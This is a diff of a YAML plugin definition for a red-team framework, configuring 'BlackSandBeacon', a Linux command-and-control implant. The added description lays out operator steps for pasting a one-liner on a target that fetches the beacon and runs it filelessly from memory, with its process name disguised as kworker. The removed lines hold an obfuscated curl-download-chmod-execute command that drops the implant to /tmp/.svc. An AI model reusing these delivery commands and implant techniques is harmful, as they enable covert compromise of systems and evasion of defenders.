@@ -1,23 +1,37 @@
 name: blacksandbeacon
-description: 'BlackSandBeacon is a Linux-native C beacon with first-class Beacon
-  Object File (BOF) support via ELF shared-object injection and direct Linux syscalls.
-  It pairs with LazyOwn''s malleable C2 profile over HTTPS and is the only open-source
-  C2 implant that brings BOF extensibility to Linux targets — a capability absent
-  from commercial C2 frameworks including Cobalt Strike.
+description: 'BlackSandBeacon is a Linux-native, memory-resident C2 beacon with native
+  in-memory ELF BOF loading: position-independent objects are fetched from the C2 and
+  executed through W^X trampolines (RunELF) so nothing ever touches the target disk.
+  Wire contract (v1.1 fileless): AES-256-CFB (CFB-128), HKDF-SHA256 derived keys
+  (salt blacksandbeacon-v2, info enc/hmac) and replay-protected reports
+  (counter + timestamp envelope) — the exact protocol lazyc2.py speaks.
 
-  Architecture: C beacon + dlopen BOF runtime. BOFs are compiled as position-independent
-  ELF shared objects (.so) and loaded into the beacon process at runtime. Arguments
-  are passed through a datap API mirroring the Windows BOF contract so existing BOF
-  source code can be ported with minimal changes.
+  Repo layout: beacons/v1 (canonical pull mode), beacons/v2 (mesh/p2p),
+  beacons/v3 (experimental), bof/<name>/ (whoami, is_sudo, cat, userenum,
+  suid_enum), c2/server.py (reference Gopher-style C2 with diskless staging),
+  config/config.json (all runtime knobs; crypto.master_key_hex preferred over
+  the legacy aes_key_hex; optional TLS cert_fingerprint_sha256 pinning).
 
-  Deployment flow:
-    1. Run `blacksandbeacon` to compile and stage the binary.
-    2. Deliver the staged binary to the target (use `lazycommand` or drop manually).
-    3. Use `blacksandbeacon_bof` to load and execute a BOF against a live session.
+  Operator flow:
+    1. Run `blacksandbeacon` — git restore + git pull + make beacon; stages the
+       binary at sessions/temp_uploads/blacksandbeacon.
+    2. Run `bsb_stage` — aligns the runtime config with the LazyOwn C2 (poll
+       /command/<id>, master key from sessions/key.aes), stages the /s/
+       implant files, generates a stage_token on first use and copies the
+       fallback-chained one-liner to the clipboard:
+       upstream /stage/ stager || raw /s/ memfd stager || disk curl.
+    3. Paste the one-liner on the target: it fetches the ELF and config
+       over HTTPS, memfd_create both and execve the beacon straight from
+       anonymous memory (no disk writes, argv[0] kworker camo).
+    4. Queue commands with issue_command_to_c2; run BOFs with bof_run.
+
+  First-time setup: assign lhost, lport and c2_port in payload.json. Free args
+  pass make targets: `blacksandbeacon beacon-v2` (mesh variant), `blacksandbeacon
+  all-beacons`, `blacksandbeacon bofs`.
 
   '
 author: LazyOwn RedTeam
-version: '1.0'
+version: '1.2'
 enabled: true
 update: true
 params:
@@ -40,8 +54,8 @@ tool:
   repo_url: https://github.com/grisuno/blacksandbeacon.git
   install_path: external/.exploit/blacksandbeacon
   install_command: make
-  execute_command: git restore . ; git pull ; make && cp build/beacon ../../../sessions/temp_uploads/blacksandbeacon
-    && echo "[blacksandbeacon] beacon staged at sessions/temp_uploads/blacksandbeacon"
-  download_file: /tmp/.svc
-  lazycommand: ofuscate_payload curl -sk "https://{lhost}:{c2_port}/download/blacksandbeacon" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &
+  execute_command: git restore . ; git pull ; make beacon && cp build/beacon ../../../sessions/temp_uploads/blacksandbeacon
+    && cp build/config.json ../../../sessions/temp_uploads/blacksandbeacon_config &&
+    echo "[blacksandbeacon] beacon + config staged at sessions/temp_uploads/"
+  lazycommand: bsb_stage
 category: 10. Command & Control
